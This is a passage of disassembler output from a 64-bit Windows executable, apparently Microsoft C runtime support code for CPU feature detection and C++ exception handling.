   1400025bd:	48 83 c1 08          	add    $0x8,%rcx
   1400025c1:	e8 a6 07 00 00       	call   0x140002d6c
   1400025c6:	f6 c3 01             	test   $0x1,%bl
   1400025c9:	74 0d                	je     0x1400025d8
   1400025cb:	ba 18 00 00 00       	mov    $0x18,%edx
   1400025d0:	48 8b cf             	mov    %rdi,%rcx
   1400025d3:	e8 44 f3 ff ff       	call   0x14000191c
   1400025d8:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400025dd:	48 8b c7             	mov    %rdi,%rax
   1400025e0:	48 83 c4 20          	add    $0x20,%rsp
   1400025e4:	5f                   	pop    %rdi
   1400025e5:	c3                   	ret
   1400025e6:	cc                   	int3
   1400025e7:	cc                   	int3
   1400025e8:	48 83 ec 48          	sub    $0x48,%rsp
   1400025ec:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400025f1:	e8 e2 fe ff ff       	call   0x1400024d8
   1400025f6:	48 8d 15 0b d0 01 00 	lea    0x1d00b(%rip),%rdx        # 0x14001f608
   1400025fd:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140002602:	e8 8d 07 00 00       	call   0x140002d94
   140002607:	cc                   	int3
   140002608:	48 83 ec 48          	sub    $0x48,%rsp
   14000260c:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140002611:	e8 22 ff ff ff       	call   0x140002538
   140002616:	48 8d 15 73 d0 01 00 	lea    0x1d073(%rip),%rdx        # 0x14001f690
   14000261d:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140002622:	e8 6d 07 00 00       	call   0x140002d94
   140002627:	cc                   	int3
   140002628:	48 83 79 08 00       	cmpq   $0x0,0x8(%rcx)
   14000262d:	48 8d 05 d4 31 01 00 	lea    0x131d4(%rip),%rax        # 0x140015808
   140002634:	48 0f 45 41 08       	cmovne 0x8(%rcx),%rax
   140002639:	c3                   	ret
   14000263a:	cc                   	int3
   14000263b:	cc                   	int3
   14000263c:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140002641:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   140002646:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   14000264b:	57                   	push   %rdi
   14000264c:	48 83 ec 10          	sub    $0x10,%rsp
   140002650:	33 c0                	xor    %eax,%eax
   140002652:	33 c9                	xor    %ecx,%ecx
   140002654:	0f a2                	cpuid
   140002656:	81 f1 6e 74 65 6c    	xor    $0x6c65746e,%ecx
   14000265c:	81 f2 69 6e 65 49    	xor    $0x49656e69,%edx
   140002662:	0b d1                	or     %ecx,%edx
   140002664:	8b e8                	mov    %eax,%ebp
   140002666:	b8 01 00 00 00       	mov    $0x1,%eax
   14000266b:	81 f3 47 65 6e 75    	xor    $0x756e6547,%ebx
   140002671:	0b d3                	or     %ebx,%edx
   140002673:	8d 48 ff             	lea    -0x1(%rax),%ecx
   140002676:	0f a2                	cpuid
   140002678:	8b f9                	mov    %ecx,%edi
   14000267a:	75 5e                	jne    0x1400026da
   14000267c:	25 f0 3f ff 0f       	and    $0xfff3ff0,%eax
   140002681:	48 c7 05 d4 e9 01 00 	movq   $0x8000,0x1e9d4(%rip)        # 0x140021060
   140002688:	00 80 00 00 
   14000268c:	48 c7 05 d1 e9 01 00 	movq   $0xffffffffffffffff,0x1e9d1(%rip)        # 0x140021068
   140002693:	ff ff ff ff 
   140002697:	3d c0 06 01 00       	cmp    $0x106c0,%eax
   14000269c:	74 28                	je     0x1400026c6
   14000269e:	3d 60 06 02 00       	cmp    $0x20660,%eax
   1400026a3:	74 21                	je     0x1400026c6
   1400026a5:	3d 70 06 02 00       	cmp    $0x20670,%eax
   1400026aa:	74 1a                	je     0x1400026c6
   1400026ac:	05 b0 f9 fc ff       	add    $0xfffcf9b0,%eax
   1400026b1:	83 f8 20             	cmp    $0x20,%eax
   1400026b4:	77 24                	ja     0x1400026da
   1400026b6:	48 b9 01 00 01 00 01 	movabs $0x100010001,%rcx
   1400026bd:	00 00 00 
   1400026c0:	48 0f a3 c1          	bt     %rax,%rcx
   1400026c4:	73 14                	jae    0x1400026da
   1400026c6:	44 8b 05 1b fa 01 00 	mov    0x1fa1b(%rip),%r8d        # 0x1400220e8
   1400026cd:	41 83 c8 01          	or     $0x1,%r8d
   1400026d1:	44 89 05 10 fa 01 00 	mov    %r8d,0x1fa10(%rip)        # 0x1400220e8
   1400026d8:	eb 07                	jmp    0x1400026e1
   1400026da:	44 8b 05 07 fa 01 00 	mov    0x1fa07(%rip),%r8d        # 0x1400220e8
   1400026e1:	45 33 c9             	xor    %r9d,%r9d
   1400026e4:	41 8b f1             	mov    %r9d,%esi
   1400026e7:	45 8b d1             	mov    %r9d,%r10d
   1400026ea:	45 8b d9             	mov    %r9d,%r11d
   1400026ed:	83 fd 07             	cmp    $0x7,%ebp
   1400026f0:	7c 40                	jl     0x140002732
   1400026f2:	41 8d 41 07          	lea    0x7(%r9),%eax
   1400026f6:	33 c9                	xor    %ecx,%ecx
   1400026f8:	0f a2                	cpuid
   1400026fa:	8b f2                	mov    %edx,%esi
   1400026fc:	44 8b cb             	mov    %ebx,%r9d
   1400026ff:	0f ba e3 09          	bt     $0x9,%ebx
   140002703:	73 0b                	jae    0x140002710
   140002705:	41 83 c8 02          	or     $0x2,%r8d
   140002709:	44 89 05 d8 f9 01 00 	mov    %r8d,0x1f9d8(%rip)        # 0x1400220e8
   140002710:	83 f8 01             	cmp    $0x1,%eax
   140002713:	7c 0d                	jl     0x140002722
   140002715:	b8 07 00 00 00       	mov    $0x7,%eax
   14000271a:	8d 48 fa             	lea    -0x6(%rax),%ecx
   14000271d:	0f a2                	cpuid
   14000271f:	44 8b d2             	mov    %edx,%r10d
   140002722:	b8 24 00 00 00       	mov    $0x24,%eax
   140002727:	3b e8                	cmp    %eax,%ebp
   140002729:	7c 07                	jl     0x140002732
   14000272b:	33 c9                	xor    %ecx,%ecx
   14000272d:	0f a2                	cpuid
   14000272f:	44 8b db             	mov    %ebx,%r11d
   140002732:	48 8b 05 17 e9 01 00 	mov    0x1e917(%rip),%rax        # 0x140021050
   140002739:	48 83 e0 fe          	and    $0xfffffffffffffffe,%rax
   14000273d:	c7 05 11 e9 01 00 01 	movl   $0x1,0x1e911(%rip)        # 0x140021058
   140002744:	00 00 00 
   140002747:	c7 05 0b e9 01 00 02 	movl   $0x2,0x1e90b(%rip)        # 0x14002105c
   14000274e:	00 00 00 
   140002751:	48 89 05 f8 e8 01 00 	mov    %rax,0x1e8f8(%rip)        # 0x140021050
   140002758:	0f ba e7 14          	bt     $0x14,%edi
   14000275c:	73 1f                	jae    0x14000277d
   14000275e:	48 83 e0 ef          	and    $0xffffffffffffffef,%rax
   140002762:	c7 05 ec e8 01 00 02 	movl   $0x2,0x1e8ec(%rip)        # 0x140021058
   140002769:	00 00 00 
   14000276c:	48 89 05 dd e8 01 00 	mov    %rax,0x1e8dd(%rip)        # 0x140021050
   140002773:	c7 05 df e8 01 00 06 	movl   $0x6,0x1e8df(%rip)        # 0x14002105c
   14000277a:	00 00 00 
   14000277d:	0f ba e7 1b          	bt     $0x1b,%edi
   140002781:	0f 83 33 01 00 00    	jae    0x1400028ba
   140002787:	33 c9                	xor    %ecx,%ecx
   140002789:	0f 01 d0             	xgetbv
   14000278c:	48 c1 e2 20          	shl    $0x20,%rdx
   140002790:	48 0b d0             	or     %rax,%rdx
   140002793:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   140002798:	0f ba e7 1c          	bt     $0x1c,%edi
   14000279c:	0f 83 fc 00 00 00    	jae    0x14000289e
   1400027a2:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   1400027a7:	24 06                	and    $0x6,%al
   1400027a9:	3c 06                	cmp    $0x6,%al
   1400027ab:	0f 85 ed 00 00 00    	jne    0x14000289e
   1400027b1:	8b 05 a5 e8 01 00    	mov    0x1e8a5(%rip),%eax        # 0x14002105c
   1400027b7:	b2 e0                	mov    $0xe0,%dl
   1400027b9:	83 c8 08             	or     $0x8,%eax
   1400027bc:	c7 05 92 e8 01 00 03 	movl   $0x3,0x1e892(%rip)        # 0x140021058
   1400027c3:	00 00 00 
   1400027c6:	89 05 90 e8 01 00    	mov    %eax,0x1e890(%rip)        # 0x14002105c
   1400027cc:	41 f6 c1 20          	test   $0x20,%r9b
   1400027d0:	74 62                	je     0x140002834
   1400027d2:	83 c8 20             	or     $0x20,%eax
   1400027d5:	c7 05 79 e8 01 00 05 	movl   $0x5,0x1e879(%rip)        # 0x140021058
   1400027dc:	00 00 00 
   1400027df:	89 05 77 e8 01 00    	mov    %eax,0x1e877(%rip)        # 0x14002105c
   1400027e5:	b9 00 00 03 d0       	mov    $0xd0030000,%ecx
   1400027ea:	48 8b 05 5f e8 01 00 	mov    0x1e85f(%rip),%rax        # 0x140021050
   1400027f1:	44 23 c9             	and    %ecx,%r9d
   1400027f4:	48 83 e0 fd          	and    $0xfffffffffffffffd,%rax
   1400027f8:	48 89 05 51 e8 01 00 	mov    %rax,0x1e851(%rip)        # 0x140021050
   1400027ff:	44 3b c9             	cmp    %ecx,%r9d
   140002802:	75 37                	jne    0x14000283b
   140002804:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   140002809:	22 c2                	and    %dl,%al
   14000280b:	3a c2                	cmp    %dl,%al
   14000280d:	75 25                	jne    0x140002834
   14000280f:	48 8b 05 3a e8 01 00 	mov    0x1e83a(%rip),%rax        # 0x140021050
   140002816:	83 0d 3f e8 01 00 40 	orl    $0x40,0x1e83f(%rip)        # 0x14002105c
   14000281d:	48 83 e0 db          	and    $0xffffffffffffffdb,%rax
   140002821:	c7 05 2d e8 01 00 06 	movl   $0x6,0x1e82d(%rip)        # 0x140021058
   140002828:	00 00 00 
   14000282b:	48 89 05 1e e8 01 00 	mov    %rax,0x1e81e(%rip)        # 0x140021050
   140002832:	eb 07                	jmp    0x14000283b
   140002834:	48 8b 05 15 e8 01 00 	mov    0x1e815(%rip),%rax        # 0x140021050
   14000283b:	0f ba e6 17          	bt     $0x17,%esi
   14000283f:	73 0c                	jae    0x14000284d
   140002841:	48 0f ba f0 18       	btr    $0x18,%rax
   140002846:	48 89 05 03 e8 01 00 	mov    %rax,0x1e803(%rip)        # 0x140021050
   14000284d:	41 0f ba e2 13       	bt     $0x13,%r10d
   140002852:	73 4a                	jae    0x14000289e
   140002854:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   140002859:	22 c2                	and    %dl,%al
   14000285b:	3a c2                	cmp    %dl,%al
   14000285d:	75 3f                	jne    0x14000289e
   14000285f:	41 8b cb             	mov    %r11d,%ecx
   140002862:	41 8b c3             	mov    %r11d,%eax
   140002865:	48 c1 e9 10          	shr    $0x10,%rcx
   140002869:	25 ff 00 04 00       	and    $0x400ff,%eax
   14000286e:	83 e1 06             	and    $0x6,%ecx
   140002871:	89 05 6d f8 01 00    	mov    %eax,0x1f86d(%rip)        # 0x1400220e4
   140002877:	48 81 c9 29 00 00 01 	or     $0x1000029,%rcx
   14000287e:	48 f7 d1             	not    %rcx
   140002881:	48 23 0d c8 e7 01 00 	and    0x1e7c8(%rip),%rcx        # 0x140021050
   140002888:	48 89 0d c1 e7 01 00 	mov    %rcx,0x1e7c1(%rip)        # 0x140021050
   14000288f:	3c 01                	cmp    $0x1,%al
   140002891:	76 0b                	jbe    0x14000289e
   140002893:	48 83 e1 bf          	and    $0xffffffffffffffbf,%rcx
   140002897:	48 89 0d b2 e7 01 00 	mov    %rcx,0x1e7b2(%rip)        # 0x140021050
   14000289e:	41 0f ba e2 15       	bt     $0x15,%r10d
   1400028a3:	73 15                	jae    0x1400028ba
   1400028a5:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   1400028aa:	48 0f ba e0 13       	bt     $0x13,%rax
   1400028af:	73 09                	jae    0x1400028ba
   1400028b1:	48 0f ba 35 96 e7 01 	btrq   $0x7,0x1e796(%rip)        # 0x140021050
   1400028b8:	00 07 
   1400028ba:	48 8b 5c 24 28       	mov    0x28(%rsp),%rbx
   1400028bf:	33 c0                	xor    %eax,%eax
   1400028c1:	48 8b 6c 24 30       	mov    0x30(%rsp),%rbp
   1400028c6:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   1400028cb:	48 83 c4 10          	add    $0x10,%rsp
   1400028cf:	5f                   	pop    %rdi
   1400028d0:	c3                   	ret
   1400028d1:	cc                   	int3
   1400028d2:	cc                   	int3
   1400028d3:	cc                   	int3
   1400028d4:	33 c0                	xor    %eax,%eax
   1400028d6:	39 05 c4 03 02 00    	cmp    %eax,0x203c4(%rip)        # 0x140022ca0
   1400028dc:	0f 95 c0             	setne  %al
   1400028df:	c3                   	ret
   1400028e0:	40 53                	rex push %rbx
   1400028e2:	48 83 ec 20          	sub    $0x20,%rsp
   1400028e6:	48 8d 05 93 2f 01 00 	lea    0x12f93(%rip),%rax        # 0x140015880
   1400028ed:	48 8b d9             	mov    %rcx,%rbx
   1400028f0:	48 89 01             	mov    %rax,(%rcx)
   1400028f3:	f6 c2 01             	test   $0x1,%dl
   1400028f6:	74 0a                	je     0x140002902
   1400028f8:	ba 18 00 00 00       	mov    $0x18,%edx
   1400028fd:	e8 1a f0 ff ff       	call   0x14000191c
   140002902:	48 8b c3             	mov    %rbx,%rax
   140002905:	48 83 c4 20          	add    $0x20,%rsp
   140002909:	5b                   	pop    %rbx
   14000290a:	c3                   	ret
   14000290b:	cc                   	int3
   14000290c:	cc                   	int3
   14000290d:	cc                   	int3
   14000290e:	cc                   	int3
   14000290f:	cc                   	int3
   140002910:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002915:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   14000291a:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000291f:	57                   	push   %rdi
   140002920:	41 54                	push   %r12
   140002922:	41 55                	push   %r13
   140002924:	41 56                	push   %r14
   140002926:	41 57                	push   %r15
   140002928:	48 83 ec 40          	sub    $0x40,%rsp
   14000292c:	48 8b f1             	mov    %rcx,%rsi
   14000292f:	4d 8b f9             	mov    %r9,%r15
   140002932:	49 8b c8             	mov    %r8,%rcx
   140002935:	49 8b e8             	mov    %r8,%rbp
   140002938:	4c 8b ea             	mov    %rdx,%r13
   14000293b:	e8 64 05 00 00       	call   0x140002ea4
   140002940:	4d 8b 67 08          	mov    0x8(%r15),%r12
   140002944:	4d 8b 37             	mov    (%r15),%r14
   140002947:	49 8b 5f 38          	mov    0x38(%r15),%rbx
   14000294b:	4d 2b f4             	sub    %r12,%r14
   14000294e:	f6 46 04 66          	testb  $0x66,0x4(%rsi)
   140002952:	41 8b 7f 48          	mov    0x48(%r15),%edi
   140002956:	0f 85 f1 00 00 00    	jne    0x140002a4d
   14000295c:	48 89 74 24 30       	mov    %rsi,0x30(%rsp)
   140002961:	48 89 6c 24 38       	mov    %rbp,0x38(%rsp)
   140002966:	e9 ce 00 00 00       	jmp    0x140002a39
   14000296b:	8b cf                	mov    %edi,%ecx
   14000296d:	48 03 c9             	add    %rcx,%rcx
   140002970:	8b ef                	mov    %edi,%ebp
   140002972:	8b 44 cb 04          	mov    0x4(%rbx,%rcx,8),%eax
   140002976:	4c 3b f0             	cmp    %rax,%r14
   140002979:	0f 82 b8 00 00 00    	jb     0x140002a37
   14000297f:	8b 44 cb 08          	mov    0x8(%rbx,%rcx,8),%eax
   140002983:	4c 3b f0             	cmp    %rax,%r14
   140002986:	0f 83 ab 00 00 00    	jae    0x140002a37
   14000298c:	83 7c cb 10 00       	cmpl   $0x0,0x10(%rbx,%rcx,8)
   140002991:	0f 84 a0 00 00 00    	je     0x140002a37
   140002997:	83 7c cb 0c 01       	cmpl   $0x1,0xc(%rbx,%rcx,8)
   14000299c:	74 1b                	je     0x1400029b9
   14000299e:	8b 44 cb 0c          	mov    0xc(%rbx,%rcx,8),%eax
   1400029a2:	49 8b d5             	mov    %r13,%rdx
   1400029a5:	49 03 c4             	add    %r12,%rax
   1400029a8:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   1400029ad:	ff d0                	call   *%rax
   1400029af:	85 c0                	test   %eax,%eax
   1400029b1:	0f 88 8f 00 00 00    	js     0x140002a46
   1400029b7:	7e 7e                	jle    0x140002a37
   1400029b9:	81 3e 63 73 6d e0    	cmpl   $0xe06d7363,(%rsi)
   1400029bf:	75 28                	jne    0x1400029e9
   1400029c1:	48 83 3d bf 2e 01 00 	cmpq   $0x0,0x12ebf(%rip)        # 0x140015888
   1400029c8:	00 
   1400029c9:	74 1e                	je     0x1400029e9
   1400029cb:	48 8d 0d b6 2e 01 00 	lea    0x12eb6(%rip),%rcx        # 0x140015888
   1400029d2:	e8 c9 09 01 00       	call   0x1400133a0
   1400029d7:	85 c0                	test   %eax,%eax
   1400029d9:	74 0e                	je     0x1400029e9
   1400029db:	ba 01 00 00 00       	mov    $0x1,%edx
   1400029e0:	48 8b ce             	mov    %rsi,%rcx
   1400029e3:	ff 15 9f 2e 01 00    	call   *0x12e9f(%rip)        # 0x140015888
   1400029e9:	48 8d 45 01          	lea    0x1(%rbp),%rax
   1400029ed:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   1400029f3:	48 03 c0             	add    %rax,%rax
   1400029f6:	49 8b d5             	mov    %r13,%rdx
   1400029f9:	8b 0c c3             	mov    (%rbx,%rax,8),%ecx
   1400029fc:	49 03 cc             	add    %r12,%rcx
   1400029ff:	e8 6c 04 00 00       	call   0x140002e70
   140002a04:	44 8b 0e             	mov    (%rsi),%r9d
   140002a07:	48 8d 45 01          	lea    0x1(%rbp),%rax
   140002a0b:	48 03 c0             	add    %rax,%rax
   140002a0e:	4c 8b c6             	mov    %rsi,%r8
   140002a11:	49 8b cd             	mov    %r13,%rcx
   140002a14:	8b 14 c3             	mov    (%rbx,%rax,8),%edx
   140002a17:	49 8b 47 40          	mov    0x40(%r15),%rax
   140002a1b:	49 03 d4             	add    %r12,%rdx
   140002a1e:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140002a23:	49 8b 47 28          	mov    0x28(%r15),%rax
   140002a27:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140002a2c:	ff 15 0e 27 01 00    	call   *0x1270e(%rip)        # 0x140015140
   140002a32:	e8 69 04 00 00       	call   0x140002ea0
   140002a37:	ff c7                	inc    %edi
   140002a39:	3b 3b                	cmp    (%rbx),%edi
   140002a3b:	0f 82 2a ff ff ff    	jb     0x14000296b
   140002a41:	e9 be 00 00 00       	jmp    0x140002b04
   140002a46:	33 c0                	xor    %eax,%eax
   140002a48:	e9 bc 00 00 00       	jmp    0x140002b09
   140002a4d:	49 8b 6f 20          	mov    0x20(%r15),%rbp
   140002a51:	49 2b ec             	sub    %r12,%rbp
   140002a54:	e9 9f 00 00 00       	jmp    0x140002af8
   140002a59:	44 8b cf             	mov    %edi,%r9d
   140002a5c:	4d 03 c9             	add    %r9,%r9
   140002a5f:	42 8b 44 cb 04       	mov    0x4(%rbx,%r9,8),%eax
   140002a64:	4c 3b f0             	cmp    %rax,%r14
   140002a67:	0f 82 89 00 00 00    	jb     0x140002af6
   140002a6d:	42 8b 44 cb 08       	mov    0x8(%rbx,%r9,8),%eax
   140002a72:	4c 3b f0             	cmp    %rax,%r14
   140002a75:	73 7f                	jae    0x140002af6
   140002a77:	f6 46 04 20          	testb  $0x20,0x4(%rsi)
   140002a7b:	74 3f                	je     0x140002abc
   140002a7d:	33 d2                	xor    %edx,%edx
   140002a7f:	45 85 c0             	test   %r8d,%r8d
   140002a82:	74 34                	je     0x140002ab8
   140002a84:	8b ca                	mov    %edx,%ecx
   140002a86:	48 03 c9             	add    %rcx,%rcx
   140002a89:	8b 44 cb 04          	mov    0x4(%rbx,%rcx,8),%eax
   140002a8d:	48 3b e8             	cmp    %rax,%rbp
   140002a90:	72 1f                	jb     0x140002ab1
   140002a92:	8b 44 cb 08          	mov    0x8(%rbx,%rcx,8),%eax
   140002a96:	48 3b e8             	cmp    %rax,%rbp
   140002a99:	73 16                	jae    0x140002ab1
   140002a9b:	42 8b 44 cb 10       	mov    0x10(%rbx,%r9,8),%eax
   140002aa0:	39 44 cb 10          	cmp    %eax,0x10(%rbx,%rcx,8)
   140002aa4:	75 0b                	jne    0x140002ab1
   140002aa6:	42 8b 44 cb 0c       	mov    0xc(%rbx,%r9,8),%eax
   140002aab:	39 44 cb 0c          	cmp    %eax,0xc(%rbx,%rcx,8)
   140002aaf:	74 07                	je     0x140002ab8
   140002ab1:	ff c2                	inc    %edx
   140002ab3:	41 3b d0             	cmp    %r8d,%edx
   140002ab6:	72 cc                	jb     0x140002a84
   140002ab8:	3b 13                	cmp    (%rbx),%edx
   140002aba:	75 48                	jne    0x140002b04
   140002abc:	8b c7                	mov    %edi,%eax
   140002abe:	48 ff c0             	inc    %rax
   140002ac1:	8b cf                	mov    %edi,%ecx
   140002ac3:	48 03 c0             	add    %rax,%rax
   140002ac6:	48 03 c9             	add    %rcx,%rcx
   140002ac9:	83 3c c3 00          	cmpl   $0x0,(%rbx,%rax,8)
   140002acd:	74 10                	je     0x140002adf
   140002acf:	8b 04 c3             	mov    (%rbx,%rax,8),%eax
   140002ad2:	48 3b e8             	cmp    %rax,%rbp
   140002ad5:	75 1f                	jne    0x140002af6
   140002ad7:	f6 46 04 20          	testb  $0x20,0x4(%rsi)
   140002adb:	75 27                	jne    0x140002b04
   140002add:	eb 17                	jmp    0x140002af6
   140002adf:	8d 47 01             	lea    0x1(%rdi),%eax
   140002ae2:	49 8b d5             	mov    %r13,%rdx
   140002ae5:	41 89 47 48          	mov    %eax,0x48(%r15)
   140002ae9:	44 8b 44 cb 0c       	mov    0xc(%rbx,%rcx,8),%r8d
   140002aee:	b1 01                	mov    $0x1,%cl
   140002af0:	4d 03 c4             	add    %r12,%r8
   140002af3:	41 ff d0             	call   *%r8
   140002af6:	ff c7                	inc    %edi
   140002af8:	44 8b 03             	mov    (%rbx),%r8d
   140002afb:	41 3b f8             	cmp    %r8d,%edi
   140002afe:	0f 82 55 ff ff ff    	jb     0x140002a59
   140002b04:	b8 01 00 00 00       	mov    $0x1,%eax
   140002b09:	4c 8d 5c 24 40       	lea    0x40(%rsp),%r11
   140002b0e:	49 8b 5b 30          	mov    0x30(%r11),%rbx
   140002b12:	49 8b 6b 38          	mov    0x38(%r11),%rbp
   140002b16:	49 8b 73 40          	mov    0x40(%r11),%rsi
   140002b1a:	49 8b e3             	mov    %r11,%rsp
   140002b1d:	41 5f                	pop    %r15
   140002b1f:	41 5e                	pop    %r14
   140002b21:	41 5d                	pop    %r13
   140002b23:	41 5c                	pop    %r12
   140002b25:	5f                   	pop    %rdi
   140002b26:	c3                   	ret
   140002b27:	cc                   	int3
   140002b28:	48 83 ec 28          	sub    $0x28,%rsp
   140002b2c:	e8 23 05 00 00       	call   0x140003054
   140002b31:	84 c0                	test   %al,%al
   140002b33:	75 04                	jne    0x140002b39
   140002b35:	32 c0                	xor    %al,%al
   140002b37:	eb 12                	jmp    0x140002b4b
   140002b39:	e8 a6 04 00 00       	call   0x140002fe4
   140002b3e:	84 c0                	test   %al,%al
   140002b40:	75 07                	jne    0x140002b49
   140002b42:	e8 55 05 00 00       	call   0x14000309c
   140002b47:	eb ec                	jmp    0x140002b35
   140002b49:	b0 01                	mov    $0x1,%al
   140002b4b:	48 83 c4 28          	add    $0x28,%rsp
   140002b4f:	c3                   	ret
   140002b50:	48 83 ec 28          	sub    $0x28,%rsp
   140002b54:	84 c9                	test   %cl,%cl
   140002b56:	75 0a                	jne    0x140002b62
   140002b58:	e8 cf 04 00 00       	call   0x14000302c
   140002b5d:	e8 3a 05 00 00       	call   0x14000309c
   140002b62:	b0 01                	mov    $0x1,%al
   140002b64:	48 83 c4 28          	add    $0x28,%rsp
   140002b68:	c3                   	ret
   140002b69:	cc                   	int3
   140002b6a:	cc                   	int3
   140002b6b:	cc                   	int3
   140002b6c:	48 3b ca             	cmp    %rdx,%rcx
   140002b6f:	75 03                	jne    0x140002b74
   140002b71:	33 c0                	xor    %eax,%eax
   140002b73:	c3                   	ret
   140002b74:	48 83 c2 09          	add    $0x9,%rdx
   140002b78:	48 83 c1 09          	add    $0x9,%rcx
   140002b7c:	e9 ef 15 01 00       	jmp    0x140014170
   140002b81:	cc                   	int3
   140002b82:	cc                   	int3
   140002b83:	cc                   	int3
   140002b84:	48 85 c9             	test   %rcx,%rcx
   140002b87:	74 6e                	je     0x140002bf7
   140002b89:	88 54 24 10          	mov    %dl,0x10(%rsp)
   140002b8d:	48 83 ec 48          	sub    $0x48,%rsp
   140002b91:	81 39 63 73 6d e0    	cmpl   $0xe06d7363,(%rcx)
   140002b97:	75 5a                	jne    0x140002bf3
   140002b99:	83 79 18 04          	cmpl   $0x4,0x18(%rcx)
   140002b9d:	75 54                	jne    0x140002bf3
   140002b9f:	8b 41 20             	mov    0x20(%rcx),%eax
   140002ba2:	3d 20 05 93 19       	cmp    $0x19930520,%eax
   140002ba7:	74 0a                	je     0x140002bb3
   140002ba9:	05 df fa 6c e6       	add    $0xe66cfadf,%eax
   140002bae:	83 f8 01             	cmp    $0x1,%eax
   140002bb1:	77 40                	ja     0x140002bf3
   140002bb3:	48 8b 41 30          	mov    0x30(%rcx),%rax
   140002bb7:	48 85 c0             	test   %rax,%rax
   140002bba:	74 37                	je     0x140002bf3
   140002bbc:	48 63 50 04          	movslq 0x4(%rax),%rdx
   140002bc0:	85 d2                	test   %edx,%edx
   140002bc2:	74 11                	je     0x140002bd5
   140002bc4:	48 03 51 38          	add    0x38(%rcx),%rdx
   140002bc8:	48 8b 49 28          	mov    0x28(%rcx),%rcx
   140002bcc:	e8 27 00 00 00       	call   0x140002bf8
   140002bd1:	eb 20                	jmp    0x140002bf3
   140002bd3:	eb 1e                	jmp    0x140002bf3
   140002bd5:	f6 00 10             	testb  $0x10,(%rax)
   140002bd8:	74 19                	je     0x140002bf3
   140002bda:	48 8b 41 28          	mov    0x28(%rcx),%rax
   140002bde:	48 8b 08             	mov    (%rax),%rcx
   140002be1:	48 85 c9             	test   %rcx,%rcx
   140002be4:	74 0d                	je     0x140002bf3
   140002be6:	48 8b 01             	mov    (%rcx),%rax
   140002be9:	48 8b 40 10          	mov    0x10(%rax),%rax
   140002bed:	ff 15 1d 27 01 00    	call   *0x1271d(%rip)        # 0x140015310
   140002bf3:	48 83 c4 48          	add    $0x48,%rsp
   140002bf7:	c3                   	ret
   140002bf8:	48 ff e2             	rex.W jmp *%rdx
   140002bfb:	cc                   	int3
   140002bfc:	40 53                	rex push %rbx
   140002bfe:	48 83 ec 20          	sub    $0x20,%rsp
   140002c02:	48 8b d9             	mov    %rcx,%rbx
   140002c05:	e8 f2 02 00 00       	call   0x140002efc
   140002c0a:	48 8b 50 58          	mov    0x58(%rax),%rdx
   140002c0e:	eb 09                	jmp    0x140002c19
   140002c10:	48 39 1a             	cmp    %rbx,(%rdx)
   140002c13:	74 12                	je     0x140002c27
   140002c15:	48 8b 52 08          	mov    0x8(%rdx),%rdx
   140002c19:	48 85 d2             	test   %rdx,%rdx
   140002c1c:	75 f2                	jne    0x140002c10
   140002c1e:	8d 42 01             	lea    0x1(%rdx),%eax
   140002c21:	48 83 c4 20          	add    $0x20,%rsp
   140002c25:	5b                   	pop    %rbx
   140002c26:	c3                   	ret
   140002c27:	33 c0                	xor    %eax,%eax
   140002c29:	eb f6                	jmp    0x140002c21
   140002c2b:	cc                   	int3
   140002c2c:	48 63 02             	movslq (%rdx),%rax
   140002c2f:	48 03 c1             	add    %rcx,%rax
   140002c32:	83 7a 04 00          	cmpl   $0x0,0x4(%rdx)
   140002c36:	7c 16                	jl     0x140002c4e
   140002c38:	4c 63 4a 04          	movslq 0x4(%rdx),%r9
   140002c3c:	48 63 52 08          	movslq 0x8(%rdx),%rdx
   140002c40:	49 8b 0c 09          	mov    (%r9,%rcx,1),%rcx
   140002c44:	4c 63 04 0a          	movslq (%rdx,%rcx,1),%r8
   140002c48:	4d 03 c1             	add    %r9,%r8
   140002c4b:	49 03 c0             	add    %r8,%rax
   140002c4e:	c3                   	ret
   140002c4f:	cc                   	int3
   140002c50:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002c55:	57                   	push   %rdi
   140002c56:	48 83 ec 20          	sub    $0x20,%rsp
   140002c5a:	48 8b 39             	mov    (%rcx),%rdi
   140002c5d:	48 8b d9             	mov    %rcx,%rbx
   140002c60:	81 3f 52 43 43 e0    	cmpl   $0xe0434352,(%rdi)
   140002c66:	74 12                	je     0x140002c7a
   140002c68:	81 3f 4d 4f 43 e0    	cmpl   $0xe0434f4d,(%rdi)
   140002c6e:	74 0a                	je     0x140002c7a
   140002c70:	81 3f 63 73 6d e0    	cmpl   $0xe06d7363,(%rdi)
   140002c76:	74 22                	je     0x140002c9a
   140002c78:	eb 13                	jmp    0x140002c8d
   140002c7a:	e8 7d 02 00 00       	call   0x140002efc
   140002c7f:	83 78 30 00          	cmpl   $0x0,0x30(%rax)
   140002c83:	7e 08                	jle    0x140002c8d
   140002c85:	e8 72 02 00 00       	call   0x140002efc
   140002c8a:	ff 48 30             	decl   0x30(%rax)
   140002c8d:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140002c92:	33 c0                	xor    %eax,%eax
   140002c94:	48 83 c4 20          	add    $0x20,%rsp
   140002c98:	5f                   	pop    %rdi
   140002c99:	c3                   	ret
   140002c9a:	e8 5d 02 00 00       	call   0x140002efc
   140002c9f:	48 89 78 20          	mov    %rdi,0x20(%rax)
   140002ca3:	48 8b 5b 08          	mov    0x8(%rbx),%rbx
   140002ca7:	e8 50 02 00 00       	call   0x140002efc
   140002cac:	48 89 58 28          	mov    %rbx,0x28(%rax)
